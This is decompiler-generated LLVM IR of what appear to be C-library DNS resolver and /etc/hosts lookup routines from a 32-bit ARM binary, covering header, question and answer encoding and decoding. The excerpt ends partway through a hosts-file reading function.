  %v0_1b1fc = load i32, i32* %lr.global-to-local, align 4
  %v1_1b1fc = add i32 %v0_1b1fc, 36
  %v2_1b1fc = inttoptr i32 %v1_1b1fc to i32*
  %v3_1b1fc = load i32, i32* %v2_1b1fc, align 4
  %v1_1b200 = trunc i32 %v3_1b1fc to i8
  %v2_1b200 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b200 = add i32 %v2_1b200, 7
  %v4_1b200 = inttoptr i32 %v3_1b200 to i8*
  store i8 %v1_1b200, i8* %v4_1b200, align 1
  %v0_1b204 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b204 = add i32 %v0_1b204, 41
  %v2_1b204 = inttoptr i32 %v1_1b204 to i8*
  %v3_1b204 = load i8, i8* %v2_1b204, align 1
  %v2_1b208 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b208 = add i32 %v2_1b208, 8
  %v4_1b208 = inttoptr i32 %v3_1b208 to i8*
  store i8 %v3_1b204, i8* %v4_1b208, align 1
  %v0_1b20c = load i32, i32* %lr.global-to-local, align 4
  %v1_1b20c = add i32 %v0_1b20c, 40
  %v2_1b20c = inttoptr i32 %v1_1b20c to i32*
  %v3_1b20c = load i32, i32* %v2_1b20c, align 4
  %v1_1b210 = trunc i32 %v3_1b20c to i8
  %v2_1b210 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b210 = add i32 %v2_1b210, 9
  %v4_1b210 = inttoptr i32 %v3_1b210 to i8*
  store i8 %v1_1b210, i8* %v4_1b210, align 1
  %v0_1b214 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b214 = add i32 %v0_1b214, 45
  %v2_1b214 = inttoptr i32 %v1_1b214 to i8*
  %v3_1b214 = load i8, i8* %v2_1b214, align 1
  %v2_1b218 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b218 = add i32 %v2_1b218, 10
  %v4_1b218 = inttoptr i32 %v3_1b218 to i8*
  store i8 %v3_1b214, i8* %v4_1b218, align 1
  %v0_1b21c = load i32, i32* %lr.global-to-local, align 4
  %v1_1b21c = add i32 %v0_1b21c, 44
  %v2_1b21c = inttoptr i32 %v1_1b21c to i32*
  %v3_1b21c = load i32, i32* %v2_1b21c, align 4
  %v1_1b220 = trunc i32 %v3_1b21c to i8
  %v2_1b220 = load i32, i32* %r4.global-to-local, align 4
  %v3_1b220 = add i32 %v2_1b220, 11
  %v4_1b220 = inttoptr i32 %v3_1b220 to i8*
  store i8 %v1_1b220, i8* %v4_1b220, align 1
  %v2_1b22c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1b228

dec_label_pc_1b228:                               ; preds = %entry, %bb26
  %v2_1b22c = phi i32 [ %v3_1b14c, %entry ], [ %v2_1b22c.pre, %bb26 ]
  %v0_1b228 = phi i32 [ -1, %entry ], [ 12, %bb26 ]
  store i32 %v2_1b22c, i32* @r4, align 4
  ret i32 %v0_1b228

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 45, { 5, 2, 3, 0, 1, 4 }
  uselistorder i32 37, { 0, 2, 1 }
  uselistorder i32 33, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1b228, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1b230 = load i8, i8* %arg1, align 1
  %v4_1b230 = zext i8 %v3_1b230 to i32
  %v2_1b234 = add i32 %tmp, 1
  %v3_1b234 = inttoptr i32 %v2_1b234 to i8*
  %v4_1b234 = load i8, i8* %v3_1b234, align 1
  %v5_1b234 = zext i8 %v4_1b234 to i32
  %v4_1b238 = mul nuw nsw i32 %v4_1b230, 256
  %v5_1b238 = or i32 %v5_1b234, %v4_1b238
  %v2_1b23c = inttoptr i32 %arg2 to i32*
  store i32 %v5_1b238, i32* %v2_1b23c, align 4
  %v2_1b240 = add i32 %tmp, 2
  %v3_1b240 = inttoptr i32 %v2_1b240 to i8*
  %v4_1b240 = load i8, i8* %v3_1b240, align 1
  %tmp4 = icmp slt i8 %v4_1b240, 0
  %v3_1b244 = zext i1 %tmp4 to i32
  %v2_1b248 = add i32 %arg2, 4
  %v3_1b248 = inttoptr i32 %v2_1b248 to i32*
  store i32 %v3_1b244, i32* %v3_1b248, align 4
  %v4_1b24c = load i8, i8* %v3_1b240, align 1
  %div = udiv i8 %v4_1b24c, 8
  %tmp5 = urem i8 %div, 16
  %v1_1b254 = zext i8 %tmp5 to i32
  %v2_1b258 = add i32 %arg2, 8
  %v3_1b258 = inttoptr i32 %v2_1b258 to i32*
  store i32 %v1_1b254, i32* %v3_1b258, align 4
  %v4_1b25c = load i8, i8* %v3_1b240, align 1
  %div1 = udiv i8 %v4_1b25c, 4
  %tmp6 = urem i8 %div1, 2
  %v1_1b264 = zext i8 %tmp6 to i32
  %v2_1b268 = add i32 %arg2, 12
  %v3_1b268 = inttoptr i32 %v2_1b268 to i32*
  store i32 %v1_1b264, i32* %v3_1b268, align 4
  %v4_1b26c = load i8, i8* %v3_1b240, align 1
  %div2 = udiv i8 %v4_1b26c, 2
  %tmp7 = urem i8 %div2, 2
  %v1_1b274 = zext i8 %tmp7 to i32
  %v2_1b278 = add i32 %arg2, 16
  %v3_1b278 = inttoptr i32 %v2_1b278 to i32*
  store i32 %v1_1b274, i32* %v3_1b278, align 4
  %v4_1b27c = load i8, i8* %v3_1b240, align 1
  %tmp8 = urem i8 %v4_1b27c, 2
  %v1_1b280 = zext i8 %tmp8 to i32
  %v2_1b284 = add i32 %arg2, 20
  %v3_1b284 = inttoptr i32 %v2_1b284 to i32*
  store i32 %v1_1b280, i32* %v3_1b284, align 4
  %v2_1b288 = add i32 %tmp, 3
  %v3_1b288 = inttoptr i32 %v2_1b288 to i8*
  %v4_1b288 = load i8, i8* %v3_1b288, align 1
  %tmp9 = icmp slt i8 %v4_1b288, 0
  %v3_1b28c = zext i1 %tmp9 to i32
  %v2_1b290 = add i32 %arg2, 24
  %v3_1b290 = inttoptr i32 %v2_1b290 to i32*
  store i32 %v3_1b28c, i32* %v3_1b290, align 4
  %v4_1b294 = load i8, i8* %v3_1b288, align 1
  %tmp10 = urem i8 %v4_1b294, 16
  %v1_1b298 = zext i8 %tmp10 to i32
  %v2_1b29c = add i32 %arg2, 28
  %v3_1b29c = inttoptr i32 %v2_1b29c to i32*
  store i32 %v1_1b298, i32* %v3_1b29c, align 4
  %v2_1b2a0 = add i32 %tmp, 4
  %v3_1b2a0 = inttoptr i32 %v2_1b2a0 to i8*
  %v4_1b2a0 = load i8, i8* %v3_1b2a0, align 1
  %v5_1b2a0 = zext i8 %v4_1b2a0 to i32
  %v2_1b2a4 = add i32 %tmp, 5
  %v3_1b2a4 = inttoptr i32 %v2_1b2a4 to i8*
  %v4_1b2a4 = load i8, i8* %v3_1b2a4, align 1
  %v5_1b2a4 = zext i8 %v4_1b2a4 to i32
  %v4_1b2a8 = mul nuw nsw i32 %v5_1b2a0, 256
  %v5_1b2a8 = or i32 %v5_1b2a4, %v4_1b2a8
  %v2_1b2ac = add i32 %arg2, 32
  %v3_1b2ac = inttoptr i32 %v2_1b2ac to i32*
  store i32 %v5_1b2a8, i32* %v3_1b2ac, align 4
  %v2_1b2b0 = add i32 %tmp, 6
  %v3_1b2b0 = inttoptr i32 %v2_1b2b0 to i8*
  %v4_1b2b0 = load i8, i8* %v3_1b2b0, align 1
  %v5_1b2b0 = zext i8 %v4_1b2b0 to i32
  %v2_1b2b4 = add i32 %tmp, 7
  %v3_1b2b4 = inttoptr i32 %v2_1b2b4 to i8*
  %v4_1b2b4 = load i8, i8* %v3_1b2b4, align 1
  %v5_1b2b4 = zext i8 %v4_1b2b4 to i32
  %v4_1b2b8 = mul nuw nsw i32 %v5_1b2b0, 256
  %v5_1b2b8 = or i32 %v5_1b2b4, %v4_1b2b8
  %v2_1b2bc = add i32 %arg2, 36
  %v3_1b2bc = inttoptr i32 %v2_1b2bc to i32*
  store i32 %v5_1b2b8, i32* %v3_1b2bc, align 4
  %v2_1b2c0 = add i32 %tmp, 8
  %v3_1b2c0 = inttoptr i32 %v2_1b2c0 to i8*
  %v4_1b2c0 = load i8, i8* %v3_1b2c0, align 1
  %v5_1b2c0 = zext i8 %v4_1b2c0 to i32
  %v2_1b2c4 = add i32 %tmp, 9
  %v3_1b2c4 = inttoptr i32 %v2_1b2c4 to i8*
  %v4_1b2c4 = load i8, i8* %v3_1b2c4, align 1
  %v5_1b2c4 = zext i8 %v4_1b2c4 to i32
  %v4_1b2c8 = mul nuw nsw i32 %v5_1b2c0, 256
  %v5_1b2c8 = or i32 %v5_1b2c4, %v4_1b2c8
  %v2_1b2cc = add i32 %arg2, 40
  %v3_1b2cc = inttoptr i32 %v2_1b2cc to i32*
  store i32 %v5_1b2c8, i32* %v3_1b2cc, align 4
  %v2_1b2d0 = add i32 %tmp, 11
  %v3_1b2d0 = inttoptr i32 %v2_1b2d0 to i8*
  %v4_1b2d0 = load i8, i8* %v3_1b2d0, align 1
  %v5_1b2d0 = zext i8 %v4_1b2d0 to i32
  %v2_1b2d4 = add i32 %tmp, 10
  %v3_1b2d4 = inttoptr i32 %v2_1b2d4 to i8*
  %v4_1b2d4 = load i8, i8* %v3_1b2d4, align 1
  %v5_1b2d4 = zext i8 %v4_1b2d4 to i32
  %v4_1b2dc = mul nuw nsw i32 %v5_1b2d4, 256
  %v5_1b2dc = or i32 %v4_1b2dc, %v5_1b2d0
  %v2_1b2e0 = add i32 %arg2, 44
  %v3_1b2e0 = inttoptr i32 %v2_1b2e0 to i32*
  store i32 %v5_1b2dc, i32* %v3_1b2e0, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 40, { 11, 12, 20, 21, 14, 6, 7, 8, 9, 4, 22, 1, 13, 2, 0, 15, 16, 17, 18, 19, 5, 10, 3 }
  uselistorder i32 28, { 42, 5, 6, 7, 4, 58, 43, 59, 62, 47, 49, 8, 50, 48, 20, 21, 1, 22, 23, 24, 25, 26, 9, 27, 15, 10, 16, 17, 60, 2, 61, 41, 3, 44, 45, 51, 52, 53, 54, 55, 56, 0, 57, 28, 46, 36, 63, 64, 65, 66, 29, 30, 31, 32, 33, 34, 35, 37, 38, 11, 12, 13, 14, 39, 40, 18, 19 }
  uselistorder i8 2, { 0, 1, 2, 3, 8, 4, 5, 6, 7 }
  uselistorder i8 8, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1b2e8 = load i32, i32* @r4, align 4
  store i32 %v3_1b2e8, i32* %stack_var_-16, align 4
  %v6_1b2e8 = load i32, i32* @r5, align 4
  %v9_1b2e8 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_1b2f0 = load i32, i32* %arg1, align 4
  store i32 %v2_1b2f0, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  %v1_1b2fc = inttoptr i32 %v2_1b2f0 to i8*
  %v2_1b2fc = call i32 @__encode_dotted(i8* %v1_1b2fc)
  store i32 %v2_1b2fc, i32* %r0.global-to-local, align 4
  %v1_1b300 = icmp slt i32 %v2_1b2fc, 0
  br i1 %v1_1b300, label %bb, label %bb6

bb:                                               ; preds = %entry
  %v5_1b308 = load i32, i32* %stack_var_-16, align 4
  store i32 %v5_1b308, i32* @r4, align 4
  store i32 %v6_1b2e8, i32* @r5, align 4
  store i32 %v9_1b2e8, i32* @r6, align 4
  ret i32 %v2_1b2fc

bb6:                                              ; preds = %entry
  %v1_1b304 = load i32, i32* @r4, align 4
  %v2_1b304 = sub i32 %v1_1b304, %v2_1b2fc
  %v0_1b310 = load i32, i32* @r6, align 4
  %v2_1b310 = add i32 %v0_1b310, %v2_1b2fc
  store i32 %v2_1b310, i32* %r2.global-to-local, align 4
  %v7_1b314 = icmp sgt i32 %v2_1b304, 3
  br i1 %v7_1b314, label %bb8, label %bb7

bb7:                                              ; preds = %bb6
  store i32 -1, i32* %r0.global-to-local, align 4
  %v10_1b318 = load i32, i32* %stack_var_-16, align 4
  store i32 %v10_1b318, i32* @r4, align 4
  store i32 %v6_1b2e8, i32* @r5, align 4
  store i32 %v9_1b2e8, i32* @r6, align 4
  ret i32 -1

bb8:                                              ; preds = %bb6
  %v0_1b31c = load i32, i32* @r5, align 4
  %v1_1b31c = add i32 %v0_1b31c, 5
  %v2_1b31c = inttoptr i32 %v1_1b31c to i8*
  %v3_1b31c = load i8, i8* %v2_1b31c, align 1
  %v5_1b320 = inttoptr i32 %v2_1b310 to i8*
  store i8 %v3_1b31c, i8* %v5_1b320, align 1
  %v0_1b324 = load i32, i32* @r5, align 4
  %v1_1b324 = add i32 %v0_1b324, 4
  %v2_1b324 = inttoptr i32 %v1_1b324 to i32*
  %v3_1b324 = load i32, i32* %v2_1b324, align 4
  %v1_1b328 = trunc i32 %v3_1b324 to i8
  %v2_1b328 = load i32, i32* %r2.global-to-local, align 4
  %v3_1b328 = add i32 %v2_1b328, 1
  %v4_1b328 = inttoptr i32 %v3_1b328 to i8*
  store i8 %v1_1b328, i8* %v4_1b328, align 1
  %v0_1b32c = load i32, i32* @r5, align 4
  %v1_1b32c = add i32 %v0_1b32c, 9
  %v2_1b32c = inttoptr i32 %v1_1b32c to i8*
  %v3_1b32c = load i8, i8* %v2_1b32c, align 1
  %v2_1b330 = load i32, i32* %r2.global-to-local, align 4
  %v3_1b330 = add i32 %v2_1b330, 2
  %v4_1b330 = inttoptr i32 %v3_1b330 to i8*
  store i8 %v3_1b32c, i8* %v4_1b330, align 1
  %v0_1b334 = load i32, i32* @r5, align 4
  %v1_1b334 = add i32 %v0_1b334, 8
  %v2_1b334 = inttoptr i32 %v1_1b334 to i32*
  %v3_1b334 = load i32, i32* %v2_1b334, align 4
  %v0_1b338 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b338 = add i32 %v0_1b338, 4
  store i32 %v1_1b338, i32* %r0.global-to-local, align 4
  %v1_1b33c = trunc i32 %v3_1b334 to i8
  %v2_1b33c = load i32, i32* %r2.global-to-local, align 4
  %v3_1b33c = add i32 %v2_1b33c, 3
  %v4_1b33c = inttoptr i32 %v3_1b33c to i8*
  store i8 %v1_1b33c, i8* %v4_1b33c, align 1
  %v2_1b340 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1b340, i32* @r4, align 4
  store i32 %v6_1b2e8, i32* @r5, align 4
  store i32 %v9_1b2e8, i32* @r6, align 4
  ret i32 %v1_1b338

; uselistorder directives
  uselistorder i32 %v2_1b2fc, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v9_1b2e8, { 1, 0, 2 }
  uselistorder i32 %v6_1b2e8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1b348 = call i32 @__length_dotted()
  %v1_1b34c = icmp slt i32 %v0_1b348, 0
  br i1 %v1_1b34c, label %bb3, label %bb

bb:                                               ; preds = %entry
  %v4_1b350 = add i32 %v0_1b348, 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v5_1b354 = phi i32 [ %v0_1b348, %entry ], [ %v4_1b350, %bb ]
  ret i32 %v5_1b354

; uselistorder directives
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-288 = alloca i32, align 4
  %v3_1b358 = load i32, i32* @r4, align 4
  %v6_1b358 = load i32, i32* @r5, align 4
  %v9_1b358 = load i32, i32* @r6, align 4
  %v12_1b358 = load i32, i32* @r7, align 4
  %v15_1b358 = load i32, i32* @r8, align 4
  %v21_1b358 = load i32, i32* @sl, align 4
  %v2_1b35c = ptrtoint i32* %stack_var_-288 to i32
  store i32 %arg3, i32* @r5, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %v2_1b35c, i32* @r2, align 4
  store i32 256, i32* @r3, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  %v0_1b378 = call i32 @__decode_dotted()
  store i32 %v0_1b378, i32* %r0.global-to-local, align 4
  store i32 %v0_1b378, i32* @r7, align 4
  %v1_1b37c = icmp slt i32 %v0_1b378, 0
  %v0_1b380 = load i32, i32* @r4, align 4
  %v2_1b380 = add i32 %v0_1b380, %v0_1b378
  store i32 %v2_1b380, i32* @r8, align 4
  br i1 %v1_1b37c, label %bb14, label %dec_label_pc_1b390

dec_label_pc_1b390:                               ; preds = %entry
  %v1_1b388 = load i32, i32* @r5, align 4
  %v2_1b388 = sub i32 %v1_1b388, %v2_1b380
  %v1_1b390 = add i32 %v2_1b388, -10
  store i32 %v1_1b390, i32* @r5, align 4
  %v6_1b390 = icmp slt i32 %v1_1b390, 0
  store i32 %v2_1b35c, i32* %r0.global-to-local, align 4
  %v0_1b398 = load i32, i32* @sl, align 4
  %v2_1b398 = add i32 %v0_1b398, %v2_1b380
  store i32 %v2_1b398, i32* @r4, align 4
  br i1 %v6_1b390, label %bb, label %dec_label_pc_1b3a4

bb:                                               ; preds = %dec_label_pc_1b390
  br label %bb14

dec_label_pc_1b3a4:                               ; preds = %dec_label_pc_1b390
  %v1_1b3a4 = bitcast i32* %stack_var_-288 to i8*
  %v2_1b3a4 = call i32 @__GI_strdup(i8* %v1_1b3a4)
  store i32 %v2_1b3a4, i32* %r0.global-to-local, align 4
  %v1_1b3a8 = load i32, i32* @r6, align 4
  %v2_1b3a8 = inttoptr i32 %v1_1b3a8 to i32*
  store i32 %v2_1b3a4, i32* %v2_1b3a8, align 4
  %v0_1b3ac = load i32, i32* @sl, align 4
  %v1_1b3ac = load i32, i32* @r8, align 4
  %v2_1b3ac = add i32 %v1_1b3ac, %v0_1b3ac
  %v3_1b3ac = inttoptr i32 %v2_1b3ac to i8*
  %v4_1b3ac = load i8, i8* %v3_1b3ac, align 1
  %v6_1b3ac = zext i8 %v4_1b3ac to i32
  %v0_1b3b0 = load i32, i32* @r4, align 4
  %v1_1b3b0 = add i32 %v0_1b3b0, 1
  %v2_1b3b0 = inttoptr i32 %v1_1b3b0 to i8*
  %v3_1b3b0 = load i8, i8* %v2_1b3b0, align 1
  %v4_1b3b0 = zext i8 %v3_1b3b0 to i32
  %v4_1b3b4 = mul nuw nsw i32 %v6_1b3ac, 256
  %v5_1b3b4 = or i32 %v4_1b3b0, %v4_1b3b4
  store i32 %v5_1b3b4, i32* %r3.global-to-local, align 4
  %v1_1b3b8 = load i32, i32* @r6, align 4
  %v2_1b3b8 = add i32 %v1_1b3b8, 4
  %v3_1b3b8 = inttoptr i32 %v2_1b3b8 to i32*
  store i32 %v5_1b3b4, i32* %v3_1b3b8, align 4
  %v0_1b3bc = load i32, i32* @r4, align 4
  %v1_1b3bc = add i32 %v0_1b3bc, 2
  store i32 %v1_1b3bc, i32* %r1.global-to-local, align 4
  %v2_1b3c0 = inttoptr i32 %v1_1b3bc to i8*
  %v3_1b3c0 = load i8, i8* %v2_1b3c0, align 1
  %v4_1b3c0 = zext i8 %v3_1b3c0 to i32
  %v1_1b3c4 = add i32 %v0_1b3bc, 3
  %v2_1b3c4 = inttoptr i32 %v1_1b3c4 to i8*
  %v3_1b3c4 = load i8, i8* %v2_1b3c4, align 1
  %v4_1b3c4 = zext i8 %v3_1b3c4 to i32
  %v4_1b3c8 = mul nuw nsw i32 %v4_1b3c0, 256
  %v5_1b3c8 = or i32 %v4_1b3c4, %v4_1b3c8
  store i32 %v5_1b3c8, i32* %r3.global-to-local, align 4
  %v1_1b3cc = load i32, i32* @r6, align 4
  %v2_1b3cc = add i32 %v1_1b3cc, 8
  %v3_1b3cc = inttoptr i32 %v2_1b3cc to i32*
  store i32 %v5_1b3c8, i32* %v3_1b3cc, align 4
  %v0_1b3d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b3d0 = add i32 %v0_1b3d0, 2
  %v1_1b3d4 = add i32 %v0_1b3d0, 3
  %v2_1b3d4 = inttoptr i32 %v1_1b3d4 to i8*
  %v3_1b3d4 = load i8, i8* %v2_1b3d4, align 1
  %v4_1b3d4 = zext i8 %v3_1b3d4 to i32
  store i32 %v4_1b3d4, i32* %r3.global-to-local, align 4
  %v2_1b3d8 = inttoptr i32 %v1_1b3d0 to i8*
  %v3_1b3d8 = load i8, i8* %v2_1b3d8, align 1
  %v4_1b3d8 = zext i8 %v3_1b3d8 to i32
  store i32 %v4_1b3d8, i32* %r0.global-to-local, align 4
  %v1_1b3dc = add i32 %v0_1b3d0, 5
  %v2_1b3dc = inttoptr i32 %v1_1b3dc to i8*
  %v3_1b3dc = load i8, i8* %v2_1b3dc, align 1
  %v4_1b3dc = zext i8 %v3_1b3dc to i32
  %v3_1b3e0 = mul nuw nsw i32 %v4_1b3d4, 65536
  store i32 %v3_1b3e0, i32* %r3.global-to-local, align 4
  %v1_1b3e4 = add i32 %v0_1b3d0, 4
  %v2_1b3e4 = inttoptr i32 %v1_1b3e4 to i8*
  %v3_1b3e4 = load i8, i8* %v2_1b3e4, align 1
  %v4_1b3e4 = zext i8 %v3_1b3e4 to i32
  %v4_1b3e8 = mul nuw i32 %v4_1b3d8, 16777216
  %v5_1b3e8 = or i32 %v4_1b3e8, %v3_1b3e0
  %v2_1b3ec = or i32 %v5_1b3e8, %v4_1b3dc
  %v4_1b3f0 = mul nuw nsw i32 %v4_1b3e4, 256
  %v5_1b3f0 = or i32 %v2_1b3ec, %v4_1b3f0
  store i32 %v5_1b3f0, i32* %r3.global-to-local, align 4
  %v1_1b3f4 = load i32, i32* @r6, align 4
  %v2_1b3f4 = add i32 %v1_1b3f4, 12
  %v3_1b3f4 = inttoptr i32 %v2_1b3f4 to i32*
  store i32 %v5_1b3f0, i32* %v3_1b3f4, align 4
  %v0_1b3f8 = load i32, i32* %r1.global-to-local, align 4
  %v1_1b3f8 = add i32 %v0_1b3f8, 6
  %v2_1b3f8 = inttoptr i32 %v1_1b3f8 to i8*
  %v3_1b3f8 = load i8, i8* %v2_1b3f8, align 1
  %v4_1b3f8 = zext i8 %v3_1b3f8 to i32
  %v0_1b3fc = load i32, i32* @r4, align 4
  %v1_1b3fc = add i32 %v0_1b3fc, 9
  %v2_1b3fc = inttoptr i32 %v1_1b3fc to i8*
  %v3_1b3fc = load i8, i8* %v2_1b3fc, align 1
  %v4_1b3fc = zext i8 %v3_1b3fc to i32
  %v1_1b400 = add i32 %v0_1b3fc, 10
  store i32 %v1_1b400, i32* %r0.global-to-local, align 4
  %v4_1b404 = mul nuw nsw i32 %v4_1b3f8, 256
  %v5_1b404 = or i32 %v4_1b3fc, %v4_1b404
  store i32 %v5_1b404, i32* %r3.global-to-local, align 4
  %v0_1b408 = load i32, i32* @r8, align 4
  %v1_1b408 = add i32 %v0_1b408, 10
  %v0_1b40c = load i32, i32* @r5, align 4
  %v1_1b410 = add nuw nsw i32 %v5_1b404, 10
  store i32 %v1_1b410, i32* %r1.global-to-local, align 4
  %v1_1b414 = load i32, i32* @r6, align 4
  %v2_1b414 = add i32 %v1_1b414, 24
  %v3_1b414 = inttoptr i32 %v2_1b414 to i32*
  store i32 %v1_1b408, i32* %v3_1b414, align 4
  %v0_1b418 = load i32, i32* %r0.global-to-local, align 4
  %v1_1b418 = load i32, i32* @r6, align 4
  %v2_1b418 = add i32 %v1_1b418, 20
  %v3_1b418 = inttoptr i32 %v2_1b418 to i32*
  store i32 %v0_1b418, i32* %v3_1b418, align 4
  %v0_1b41c = load i32, i32* %r3.global-to-local, align 4
  %v1_1b41c = load i32, i32* @r6, align 4
  %v2_1b41c = add i32 %v1_1b41c, 16
  %v3_1b41c = inttoptr i32 %v2_1b41c to i32*
  store i32 %v0_1b41c, i32* %v3_1b41c, align 4
  %v0_1b420 = load i32, i32* @r7, align 4
  %v1_1b420 = load i32, i32* %r1.global-to-local, align 4
  %v2_1b420 = add i32 %v1_1b420, %v0_1b420
  %v5_1b424 = icmp slt i32 %v0_1b40c, %v5_1b404
  %.v2_1b420 = select i1 %v5_1b424, i32 -1, i32 %v2_1b420
  br label %bb14

bb14:                                             ; preds = %bb, %dec_label_pc_1b3a4, %entry
  %v0_1b428 = phi i32 [ %.v2_1b420, %dec_label_pc_1b3a4 ], [ %v1_1b390, %bb ], [ %v0_1b378, %entry ]
  store i32 %v0_1b428, i32* %r0.global-to-local, align 4
  store i32 %v3_1b358, i32* @r4, align 4
  store i32 %v6_1b358, i32* @r5, align 4
  store i32 %v9_1b358, i32* @r6, align 4
  store i32 %v12_1b358, i32* @r7, align 4
  store i32 %v15_1b358, i32* @r8, align 4
  store i32 %v21_1b358, i32* @sl, align 4
  ret i32 %v0_1b428

; uselistorder directives
  uselistorder i32 %v0_1b428, { 1, 0 }
  uselistorder i32 %v5_1b404, { 1, 0, 2 }
  uselistorder i32 %v3_1b3e0, { 1, 0 }
  uselistorder i32 %v1_1b390, { 0, 2, 1 }
  uselistorder i32 %v0_1b378, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 24, { 26, 27, 28, 2, 42, 34, 11, 12, 13, 14, 15, 10, 43, 3, 0, 29, 30, 31, 44, 16, 25, 17, 1, 32, 36, 37, 38, 39, 40, 41, 18, 35, 33, 24, 19, 20, 21, 22, 23, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 -10, { 2, 1, 0 }
  uselistorder label %bb14, { 1, 0, 2 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1ddc0.945 to i32), i32* @r1, align 4
  %v0_1b438 = load i32, i32* @lr, align 4
  store i32 %v0_1b438, i32* %stack_var_-4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1dee4.1041 to i32), i32* @r0, align 4
  %v3_1b440 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_1dee4.1041 to i32), i32 ptrtoint (i32* @global_var_1ddc0.945 to i32))
  %v2_1b444 = icmp eq i32 %v3_1b440, 0
  store i32 ptrtoint (i32* @global_var_1ddc0.945 to i32), i32* @r1, align 4
  br i1 %v2_1b444, label %bb2, label %bb

bb:                                               ; preds = %entry
  ret i32 %v3_1b440

bb2:                                              ; preds = %entry
  store i32 ptrtoint ([18 x i8]* @global_var_1def0.1043 to i32), i32* @r0, align 4
  %v2_1b454 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_1b454, i32* @lr, align 4
  %v3_1b458 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_1def0.1043 to i32), i32 ptrtoint (i32* @global_var_1ddc0.945 to i32))
  ret i32 %v3_1b458

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 7, 2, 1, 0, 6, 5, 4, 3 }
  uselistorder i32 114, { 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_1ddc0.945 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-64 = alloca i32, align 4
  %v3_1b468 = load i32, i32* @r4, align 4
  %v6_1b468 = load i32, i32* @r5, align 4
  %v12_1b468 = load i32, i32* @r7, align 4
  %v15_1b468 = load i32, i32* @r8, align 4
  %v21_1b468 = load i32, i32* @sl, align 4
  %v24_1b468 = load i32, i32* @fp, align 4
  store i32 %tmp61, i32* @r4, align 4
  %v1_1b474 = sub i32 0, %tmp61
  %v1_1b478 = urem i32 %v1_1b474, 4
  store i32 %v1_1b478, i32* %ip.global-to-local, align 4
  %v2_1b478 = icmp eq i32 %v1_1b478, 0
  %v0_1b47c = load i32, i32* @r2, align 4
  %v0_1b480 = load i32, i32* @r0, align 4
  %v0_1b484 = load i32, i32* @r1, align 4
  %v0_1b488 = load i32, i32* @r3, align 4
  store i32 %v0_1b488, i32* %stack_var_-64, align 4
  store i32 %tmp57, i32* %r2.global-to-local, align 4
  br i1 %v2_1b478, label %dec_label_pc_1b4a8, label %dec_label_pc_1b498

dec_label_pc_1b498:                               ; preds = %entry
  %v2_1b498 = sub i32 %tmp57, %v1_1b478
  %v3_1b498 = icmp ult i32 %tmp57, %v1_1b478
